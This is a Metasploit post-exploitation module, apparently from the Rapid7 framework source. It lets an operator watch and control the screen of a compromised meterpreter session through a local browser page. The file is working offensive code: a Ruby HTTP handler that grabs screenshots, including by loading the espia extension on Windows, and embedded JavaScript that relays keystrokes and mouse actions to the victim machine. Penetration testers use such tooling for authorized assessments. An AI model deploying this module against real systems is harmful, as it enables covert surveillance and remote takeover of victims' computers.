##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Manage the screen of the target meterpreter session',
        'Description' => %q{
          This module allows you to view and control the screen of the target computer via
          a local browser window. The module continually screenshots the target screen and
          also relays all mouse and keyboard events to session.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'timwr'],
        'Platform' => [ 'linux', 'win', 'osx' ],
        'SessionTypes' => [ 'meterpreter' ],
        'DefaultOptions' => { 'SRVHOST' => '127.0.0.1' }
      )
    )
  end

  def run
    @last_sequence = 0
    @key_sequence = {}
    exploit
  end

  def perform_event(query)
    action = query['action'].first
    if action == 'key'
      key = query['key'].first.to_i
      keyaction = query['keyaction'].first.to_i
      session.ui.keyevent_send(key, keyaction) if key
    else
      x = query['x'].first
      y = query['y'].first
      session.ui.mouse(action, x, y)
    end
  end

  def on_request_uri(cli, request)
    if request.uri =~ %r{/screenshot$}
      data = ''
      if session.platform == 'windows'
        session.console.run_single('load espia') unless session.espia
        data = session.espia.espia_image_get_dev_screen
      else
        data = session.ui.screenshot(50)
      end
      send_response(cli, data, { 'Content-Type' => 'image/jpeg', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })
    elsif request.uri =~ %r{/event$}
      query = CGI.parse(request.body)
      seq = query['i'].first.to_i
      if seq <= @last_sequence + 1
        perform_event(query)
        @last_sequence = seq
      else
        @key_sequence[seq] = query
      end
      loop do
        event = @key_sequence[@last_sequence + 1]
        break unless event

        perform_event(event)
        @last_sequence += 1
        @key_sequence.delete(@last_sequence)
      end

      send_response(cli, '')
    else
      print_status("Sent screenshare html to #{cli.peerhost}")
      uripath = get_resource
      uripath += '/' unless uripath.end_with? '/'
      html = %^<html>
<head>
<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<title>Metasploit screenshare</title>
</head>
<body onload="updateImage()">
<noscript>
<h2 style="color:#f00">Error: You need JavaScript enabled to watch the stream.</h2>
</noscript>
<img onload="updateImage()" onerror="noImage()" id="streamer">
<br><br>
<a href="https://www.metasploit.com" target="_blank">www.metasploit.com</a>
</body>
<script type="text/javascript">
var i = 1;
var img = document.getElementById("streamer");

function noImage() {
  img.style = "display:none";
}

function updateImage() {
  img.src = "#{uripath}screenshot#" + Date.now();
  img.style = "display:";
}

function mouseEvent(action, x, y) {
  var req = new XMLHttpRequest;
  req.open("POST", "#{uripath}event", true);
  req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  req.send('action='+action+'&x='+x+'&y='+y+'&i='+i);
  i++;
}

function keyEvent(action, key) {
  if (key == 59) {
    key = 186
  } else if (key == 61) {
    key = 187
  } else if (key == 173) {
    key = 189
  }
  var req = new XMLHttpRequest;
  req.open("POST", "#{uripath}event", true);
  req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  req.send('action=key&keyaction='+action+'&key='+key+'&i='+i);
  i++;
}

document.onkeydown = function(event) {
  var key = event.which || event.keyCode;
  keyEvent(1, key);
  event.preventDefault();
}

document.onkeyup = function(event) {
  var key = event.which || event.keyCode;
  keyEvent(2, key);
  event.preventDefault();
}

img.addEventListener("contextmenu", function(e){ e.preventDefault(); }, false);
img.onmousemove = function(event) {
  mouseEvent('move', event.pageX - img.offsetLeft, event.pageY - img.offsetTop);
  event.preventDefault();
}
img.onmousedown = function(event) {
  var action = 'leftdown';
  if (event.which == 3) {
    action = 'rightdown';
  }
  mouseEvent(action, event.pageX - img.offsetLeft, event.pageY - img.offsetTop);
  event.preventDefault();
}
img.onmouseup = function(event) {
  var action = 'leftup';
  if (event.which == 3) {
    action = 'rightup';
  }
  mouseEvent(action, event.pageX - img.offsetLeft, event.pageY - img.offsetTop);
  event.preventDefault();
}
img.ondblclick = function(event) {
  mouseEvent('doubleclick', event.pageX - img.offsetLeft, event.pageY - img.offsetTop);
  event.preventDefault();
}
</script>
</html>
    ^
      send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })
    end
  end
end
